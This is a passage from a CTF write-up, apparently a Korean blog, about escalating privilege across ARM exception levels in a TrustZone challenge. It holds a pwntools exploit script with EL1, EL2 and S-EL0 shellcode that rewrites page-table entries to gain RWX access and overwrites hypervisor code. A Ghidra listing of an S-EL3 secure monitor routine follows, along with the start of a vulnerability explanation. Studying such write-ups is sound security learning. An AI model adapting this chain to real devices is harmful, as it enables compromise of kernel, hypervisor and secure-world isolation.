</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    str w2, [x9, #20] // this is needed to get out of the freelist loop.
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    movz x0, #0x8300, lsl 16          
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    movk x0, #0x06, lsl 0
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov x1, x10
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    smc #0x1337
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    // get .text
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov w2, #3
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    str w2, [x9] // cmd
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov w2, #5
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    str w2, [x9, #4] // idx
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    movz w2, #0x0000, lsl 16
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    movk w2, #0x1900, lsl 0
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    str w2, [x9, #8] // sz
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov x8, #0x0 
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    loop_copy:                  
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        add x2, x21, x8
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        add x1, x20, x8
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        ldrb w0, [x1]
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        strb w0, [x2]
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        add x8, x8, #1
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        cmp x8, #</span><span style="color:#e6db74">{</span>len(SEL0_shellcode)<span style="color:#e6db74">}</span><span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        bne loop_copy
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    movz x0, #0x8300, lsl 16          
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    movk x0, #0x06, lsl 0
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov x1, x10
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    smc #0x1337
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    movz x0, #0x8300, lsl 16          
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    movk x0, #0x05, lsl 0
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    ldr x1, =0x2000000
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov x2, #0x100
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    smc #0x1337
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov x8, #0x0 
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    loop_print_flag_sel1:                  
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        add x1, x21, x8 // dst
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        ldrb w0, [x1]
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        strb w0, [x11]
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        add x8, x8, #1
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        cmp x8, #</span><span style="color:#e6db74">{</span><span style="color:#ae81ff">0x20</span><span style="color:#e6db74">}</span><span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        bne loop_print_flag_sel1
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;&#39;&#39;</span>) 
</span></span><span style="display:flex;"><span>EL2_shellcode <span style="color:#f92672">+=</span>  <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span> <span style="color:#f92672">*</span> (<span style="color:#ae81ff">0x250</span><span style="color:#f92672">-</span> len(EL2_shellcode)) <span style="color:#f92672">+</span> TCI_Data
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>EL2_shellcode <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x41</span><span style="color:#e6db74">&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">0xc</span><span style="color:#f92672">+</span>EL2_shellcode
</span></span><span style="display:flex;"><span>entry <span style="color:#f92672">=</span> <span style="color:#ae81ff">0xffffffffc001e000</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">0xf0</span> 
</span></span><span style="display:flex;"><span>addr <span style="color:#f92672">=</span> <span style="color:#ae81ff">0xffffffffc00091b8</span>
</span></span><span style="display:flex;"><span>IPA <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x2400</span> <span style="color:#f92672">|</span> (<span style="color:#ae81ff">0b11</span><span style="color:#f92672">&lt;&lt;</span><span style="color:#ae81ff">6</span>) <span style="color:#75715e"># s2ap 11</span>
</span></span><span style="display:flex;"><span>DESC <span style="color:#f92672">=</span> <span style="color:#ae81ff">3</span> <span style="color:#f92672">|</span> <span style="color:#ae81ff">0x100000</span>
</span></span><span style="display:flex;"><span>EL2_TEXT <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x00007ffeffffa000</span>
</span></span><span style="display:flex;"><span>entry_user <span style="color:#f92672">=</span> <span style="color:#ae81ff">0xffffffffc0028000</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">0xfd0</span>
</span></span><span style="display:flex;"><span>user_val <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x2403</span> <span style="color:#f92672">|</span> <span style="color:#ae81ff">64</span> <span style="color:#f92672">|</span> <span style="color:#ae81ff">0x0020000000000000</span><span style="color:#75715e"># ap 01</span>
</span></span><span style="display:flex;"><span>EL2_shellcode_addr <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x7ffeffffc100</span>
</span></span><span style="display:flex;"><span>EL1_shellcode <span style="color:#f92672">=</span> asm(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;nop&#39;</span>)<span style="color:#f92672">*</span>(<span style="color:#ae81ff">0x400</span><span style="color:#f92672">//</span><span style="color:#ae81ff">4</span>)
</span></span><span style="display:flex;"><span>EL1_shellcode <span style="color:#f92672">+=</span> asm(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;&#39;&#39;</span><span style="color:#ae81ff">\
</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span><span style="color:#e6db74">    mov x0, #1 
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    movz x1, #</span><span style="color:#e6db74">{</span>((IPA)<span style="color:#f92672">&gt;&gt;</span><span style="color:#ae81ff">48</span>)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xffff</span><span style="color:#e6db74">}</span><span style="color:#e6db74">, lsl #48
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    movk x1, #</span><span style="color:#e6db74">{</span>((IPA)<span style="color:#f92672">&gt;&gt;</span><span style="color:#ae81ff">32</span>)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xffff</span><span style="color:#e6db74">}</span><span style="color:#e6db74">, lsl #32
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    movk x1, #</span><span style="color:#e6db74">{</span>((IPA)<span style="color:#f92672">&gt;&gt;</span><span style="color:#ae81ff">16</span>)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xffff</span><span style="color:#e6db74">}</span><span style="color:#e6db74">, lsl #16
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    movk x1, #</span><span style="color:#e6db74">{</span>(IPA)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xffff</span><span style="color:#e6db74">}</span><span style="color:#e6db74">, lsl #0
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    movz x2, #</span><span style="color:#e6db74">{</span>((DESC)<span style="color:#f92672">&gt;&gt;</span><span style="color:#ae81ff">48</span>)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xffff</span><span style="color:#e6db74">}</span><span style="color:#e6db74">, lsl #48
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    movk x2, #</span><span style="color:#e6db74">{</span>((DESC)<span style="color:#f92672">&gt;&gt;</span><span style="color:#ae81ff">32</span>)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xffff</span><span style="color:#e6db74">}</span><span style="color:#e6db74">, lsl #32
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    movk x2, #</span><span style="color:#e6db74">{</span>((DESC)<span style="color:#f92672">&gt;&gt;</span><span style="color:#ae81ff">16</span>)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xffff</span><span style="color:#e6db74">}</span><span style="color:#e6db74">, lsl #16
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    movk x2, #</span><span style="color:#e6db74">{</span>(DESC)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xffff</span><span style="color:#e6db74">}</span><span style="color:#e6db74">, lsl #0
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    hvc #0x1337 // PA 0x0000000040102000 RWX
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    movz x11, #</span><span style="color:#e6db74">{</span>((entry_user)<span style="color:#f92672">&gt;&gt;</span><span style="color:#ae81ff">48</span>)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xffff</span><span style="color:#e6db74">}</span><span style="color:#e6db74">, lsl #48
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    movk x11, #</span><span style="color:#e6db74">{</span>((entry_user)<span style="color:#f92672">&gt;&gt;</span><span style="color:#ae81ff">32</span>)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xffff</span><span style="color:#e6db74">}</span><span style="color:#e6db74">, lsl #32
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    movk x11, #</span><span style="color:#e6db74">{</span>((entry_user)<span style="color:#f92672">&gt;&gt;</span><span style="color:#ae81ff">16</span>)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xffff</span><span style="color:#e6db74">}</span><span style="color:#e6db74">, lsl #16
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    movk x11, #</span><span style="color:#e6db74">{</span>(entry_user)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xffff</span><span style="color:#e6db74">}</span><span style="color:#e6db74">, lsl #0
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    movz x10, #</span><span style="color:#e6db74">{</span>((user_val)<span style="color:#f92672">&gt;&gt;</span><span style="color:#ae81ff">48</span>)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xffff</span><span style="color:#e6db74">}</span><span style="color:#e6db74">, lsl #48
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    movk x10, #</span><span style="color:#e6db74">{</span>((user_val)<span style="color:#f92672">&gt;&gt;</span><span style="color:#ae81ff">32</span>)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xffff</span><span style="color:#e6db74">}</span><span style="color:#e6db74">, lsl #32
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    movk x10, #</span><span style="color:#e6db74">{</span>((user_val)<span style="color:#f92672">&gt;&gt;</span><span style="color:#ae81ff">16</span>)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xffff</span><span style="color:#e6db74">}</span><span style="color:#e6db74">, lsl #16
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    movk x10, #</span><span style="color:#e6db74">{</span>(user_val)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xffff</span><span style="color:#e6db74">}</span><span style="color:#e6db74">, lsl #0
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    str x10, [x11] // IPA 0x0000000000002000 RW
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    movz x11, #</span><span style="color:#e6db74">{</span>((EL2_TEXT)<span style="color:#f92672">&gt;&gt;</span><span style="color:#ae81ff">48</span>)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xffff</span><span style="color:#e6db74">}</span><span style="color:#e6db74">, lsl #48
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    movk x11, #</span><span style="color:#e6db74">{</span>((EL2_TEXT)<span style="color:#f92672">&gt;&gt;</span><span style="color:#ae81ff">32</span>)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xffff</span><span style="color:#e6db74">}</span><span style="color:#e6db74">, lsl #32
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    movk x11, #</span><span style="color:#e6db74">{</span>((EL2_TEXT)<span style="color:#f92672">&gt;&gt;</span><span style="color:#ae81ff">16</span>)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xffff</span><span style="color:#e6db74">}</span><span style="color:#e6db74">, lsl #16
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    movk x11, #</span><span style="color:#e6db74">{</span>(EL2_TEXT)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xffff</span><span style="color:#e6db74">}</span><span style="color:#e6db74">, lsl #0
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    movz x12, #</span><span style="color:#e6db74">{</span>((EL2_shellcode_addr)<span style="color:#f92672">&gt;&gt;</span><span style="color:#ae81ff">48</span>)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xffff</span><span style="color:#e6db74">}</span><span style="color:#e6db74">, lsl #48
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    movk x12, #</span><span style="color:#e6db74">{</span>((EL2_shellcode_addr)<span style="color:#f92672">&gt;&gt;</span><span style="color:#ae81ff">32</span>)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xffff</span><span style="color:#e6db74">}</span><span style="color:#e6db74">, lsl #32
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    movk x12, #</span><span style="color:#e6db74">{</span>((EL2_shellcode_addr)<span style="color:#f92672">&gt;&gt;</span><span style="color:#ae81ff">16</span>)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xffff</span><span style="color:#e6db74">}</span><span style="color:#e6db74">, lsl #16
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    movk x12, #</span><span style="color:#e6db74">{</span>(EL2_shellcode_addr)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xffff</span><span style="color:#e6db74">}</span><span style="color:#e6db74">, lsl #0
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov x9, #0x0 
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    loop:                  
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        add x2, x11, x9
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        add x1, x12, x9
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        ldrb w0, [x1]
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        strb w0, [x2]
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        add w9, w9, #1
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        cmp x9, #</span><span style="color:#e6db74">{</span>len(EL2_shellcode)<span style="color:#e6db74">}</span><span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        bne loop
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    hvc #0x1337 // trigger!!!
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;&#39;&#39;</span>)
</span></span><span style="display:flex;"><span>cnt <span style="color:#f92672">=</span> len(EL1_shellcode)
</span></span><span style="display:flex;"><span>val <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0040000000036483</span>
</span></span><span style="display:flex;"><span>shellcode <span style="color:#f92672">=</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;&#39;&#39;</span><span style="color:#ae81ff">\
</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span><span style="color:#e6db74">    mov x5, #-1
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov w4, #0x0
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov w3, #0x0
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov w2, #3
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov x1, #0x1000
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov x0, #0x0
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov x8, #0xde
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    svc #0x1337
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov x11, x0 // IPA 0x36000
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov x9, #0x0 
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    loop:                   
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        add x1, x11, x9
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        mov x8, #0x3f
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        mov x0, #0
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        mov x2, #0x1
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        svc #0x1337
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        add w9, w9, #1
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        cmp x9, #</span><span style="color:#e6db74">{</span>cnt<span style="color:#e6db74">}</span><span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        bne loop
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov x0, x11
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov x1, #0x1000
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov x2, #5 // r-x
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov x8, #0xe2
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    svc #0x1337
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov x5, #-1
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov w4, #0x0
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov w3, #0x0
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov w2, #3
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov x1, #0x1000
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov x0, #0x0
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov x8, #0xde
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    svc #0x1337 // IPA 0x37000
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    movz x11, #</span><span style="color:#e6db74">{</span>((entry)<span style="color:#f92672">&gt;&gt;</span><span style="color:#ae81ff">48</span>)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xffff</span><span style="color:#e6db74">}</span><span style="color:#e6db74">, lsl #48
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    movk x11, #</span><span style="color:#e6db74">{</span>((entry)<span style="color:#f92672">&gt;&gt;</span><span style="color:#ae81ff">32</span>)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xffff</span><span style="color:#e6db74">}</span><span style="color:#e6db74">, lsl #32
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    movk x11, #</span><span style="color:#e6db74">{</span>((entry)<span style="color:#f92672">&gt;&gt;</span><span style="color:#ae81ff">16</span>)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xffff</span><span style="color:#e6db74">}</span><span style="color:#e6db74">, lsl #16
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    movk x11, #</span><span style="color:#e6db74">{</span>(entry)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xffff</span><span style="color:#e6db74">}</span><span style="color:#e6db74">, lsl #0
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov x0, #0
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov x1, x11
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov x8, #0x3f
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov x2, #1
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    svc #0x1337 // now we can modify the kernel page table
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    movz x10, #</span><span style="color:#e6db74">{</span>((val)<span style="color:#f92672">&gt;&gt;</span><span style="color:#ae81ff">48</span>)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xffff</span><span style="color:#e6db74">}</span><span style="color:#e6db74">, lsl #48
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    movk x10, #</span><span style="color:#e6db74">{</span>((val)<span style="color:#f92672">&gt;&gt;</span><span style="color:#ae81ff">32</span>)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xffff</span><span style="color:#e6db74">}</span><span style="color:#e6db74">, lsl #32
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    movk x10, #</span><span style="color:#e6db74">{</span>((val)<span style="color:#f92672">&gt;&gt;</span><span style="color:#ae81ff">16</span>)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xffff</span><span style="color:#e6db74">}</span><span style="color:#e6db74">, lsl #16
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    movk x10, #</span><span style="color:#e6db74">{</span>(val)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xffff</span><span style="color:#e6db74">}</span><span style="color:#e6db74">, lsl #0
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    sub x11, x11, #0xa0
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    str x10, [x11]
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov x8, #0x123
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    svc #0x1337
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;&#39;&#39;</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> bytes(ks<span style="color:#f92672">.</span>asm(shellcode)[<span style="color:#ae81ff">0</span>])
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x41</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">*</span> (<span style="color:#ae81ff">0x100</span> <span style="color:#f92672">-</span> len(payload))
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> EL2_shellcode 
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">assert</span> len(payload) <span style="color:#f92672">&lt;=</span> <span style="color:#ae81ff">0x500</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x41</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">*</span> (<span style="color:#ae81ff">0x500</span> <span style="color:#f92672">-</span> len(payload))
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> SEL0_shellcode
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x41</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">*</span> (<span style="color:#ae81ff">0x1000</span> <span style="color:#f92672">-</span> len(payload))
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>send(payload)
</span></span><span style="display:flex;"><span>sleep(<span style="color:#ae81ff">0.1</span>)
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>send(EL1_shellcode)
</span></span><span style="display:flex;"><span>sleep(<span style="color:#ae81ff">0.1</span>)
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>send(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x43</span><span style="color:#e6db74">&#39;</span>) <span style="color:#75715e"># AP 01 -&gt; EL0 RW EL1 RW </span>
</span></span><span style="display:flex;"><span>sleep(<span style="color:#ae81ff">0.1</span>)
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>interactive()
</span></span></code></pre></div><h1 id="s-el3-secure-monitor">S-EL3, Secure monitor<a hidden class="anchor" aria-hidden="true" href="#s-el3-secure-monitor">#</a></h1>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-Python" data-lang="Python"><span style="display:flex;"><span>                             <span style="color:#f92672">*************************************************************</span>
</span></span><span style="display:flex;"><span>                             <span style="color:#f92672">*</span>                           FUNCTION                          
</span></span><span style="display:flex;"><span>                             <span style="color:#f92672">*************************************************************</span>
</span></span><span style="display:flex;"><span>                             undefined  FUN_00000fa8 (undefined  param_1 , undefined  par
</span></span><span style="display:flex;"><span>             undefined         w0:<span style="color:#ae81ff">1</span>           <span style="color:#f92672">&lt;</span>RETURN<span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>             undefined         w0:<span style="color:#ae81ff">1</span>           param_1
</span></span><span style="display:flex;"><span>             undefined         w1:<span style="color:#ae81ff">1</span>           param_2
</span></span><span style="display:flex;"><span>             undefined         w2:<span style="color:#ae81ff">1</span>           param_3
</span></span><span style="display:flex;"><span>             undefined         w3:<span style="color:#ae81ff">1</span>           param_4
</span></span><span style="display:flex;"><span>             undefined         w4:<span style="color:#ae81ff">1</span>           param_5
</span></span><span style="display:flex;"><span>             undefined         w5:<span style="color:#ae81ff">1</span>           param_6
</span></span><span style="display:flex;"><span>             undefined         w6:<span style="color:#ae81ff">1</span>           param_7
</span></span><span style="display:flex;"><span>             undefined         w7:<span style="color:#ae81ff">1</span>           param_8
</span></span><span style="display:flex;"><span>             undefined         Stack[<span style="color:#ae81ff">0x0</span>]:<span style="color:#ae81ff">1</span>   param_9
</span></span><span style="display:flex;"><span>             undefined         Stack[<span style="color:#ae81ff">0x8</span>]:<span style="color:#ae81ff">1</span>   param_10
</span></span><span style="display:flex;"><span>             undefined8        Stack[<span style="color:#ae81ff">0x110</span>]:<span style="color:#ae81ff">8</span> param_11                                XREF[<span style="color:#ae81ff">1</span>]:     <span style="color:#ae81ff">00000</span>fb0 (W)   
</span></span><span style="display:flex;"><span>             undefined8        Stack[<span style="color:#ae81ff">0x120</span>]:<span style="color:#ae81ff">8</span> ELR_EL3
</span></span><span style="display:flex;"><span>             undefined8        Stack[<span style="color:#ae81ff">0x118</span>]:<span style="color:#ae81ff">8</span> SPSR_EL3                                XREF[<span style="color:#ae81ff">1</span>]:     <span style="color:#ae81ff">00000</span>fb8 (R)   
</span></span><span style="display:flex;"><span>             undefined8        Stack[<span style="color:#ae81ff">0x100</span>]:<span style="color:#ae81ff">8</span> SCR_EL3                                 XREF[<span style="color:#ae81ff">1</span>]:     <span style="color:#ae81ff">00000</span>fb4 (R)   
</span></span><span style="display:flex;"><span>                             FUN_00000fa8                                    XREF[<span style="color:#ae81ff">3</span>]:     FUN_00000000:<span style="color:#ae81ff">000000</span>b0 (c) , 
</span></span><span style="display:flex;"><span>                                                                                          FUN_00000c90:<span style="color:#ae81ff">00000</span>cb4 (c) , 
</span></span><span style="display:flex;"><span>                                                                                          FUN_00002400:<span style="color:#ae81ff">00002840</span> (c)   
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">00000</span>fa8 f1  <span style="color:#ae81ff">03</span>  <span style="color:#ae81ff">00</span>  <span style="color:#ae81ff">91</span>    mov        x17 ,sp
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">00000</span>fac bf  <span style="color:#ae81ff">41</span>  <span style="color:#ae81ff">00</span>  d5    msr        PState<span style="color:#f92672">.</span>SP,<span style="color:#75715e">#0x1</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">00000</span>fb0 f1  <span style="color:#ae81ff">8</span>b  <span style="color:#ae81ff">00</span>  f9    str        x17 ,[sp, <span style="color:#75715e">#param_11 ]</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">00000</span>fb4 f2  <span style="color:#ae81ff">83</span>  <span style="color:#ae81ff">40</span>  f9    ldr        x18 ,[sp, <span style="color:#75715e">#SCR_EL3 ]</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">00000</span>fb8 f0  c7  <span style="color:#ae81ff">51</span>  a9    ldp        x16 ,x17 ,[sp, <span style="color:#75715e">#SPSR_EL3 ]</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">00000</span>fbc <span style="color:#ae81ff">12</span>  <span style="color:#ae81ff">11</span>  <span style="color:#ae81ff">1</span>e  d5    msr        scr_el3 ,x18
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">00000</span>fc0 <span style="color:#ae81ff">10</span>  <span style="color:#ae81ff">40</span>  <span style="color:#ae81ff">1</span>e  d5    msr        spsr_el3 ,x16
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">00000</span>fc4 <span style="color:#ae81ff">31</span>  <span style="color:#ae81ff">40</span>  <span style="color:#ae81ff">1</span>e  d5    msr        elr_el3 ,x17
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">00000</span>fc8 f5  ff  ff  <span style="color:#ae81ff">17</span>    b          FUN_00000f9c                                     undefined FUN_00000f9c(undefined
</span></span><span style="display:flex;"><span>                             <span style="color:#f92672">--</span> Flow Override: CALL_RETURN (CALL_TERMINATOR)
</span></span></code></pre></div><p>전에 분석했을 때는 전혀 취약점이 보이지 않았었다.
지금 다시 보니 쉽게 구조적인 취약점을 발견할 수 있었다.
취약점 상세 내용은 다음과 같다.</p>
<p>S-EL3의 일부 rw가 필요한 영역은 RAM에 적재된다.
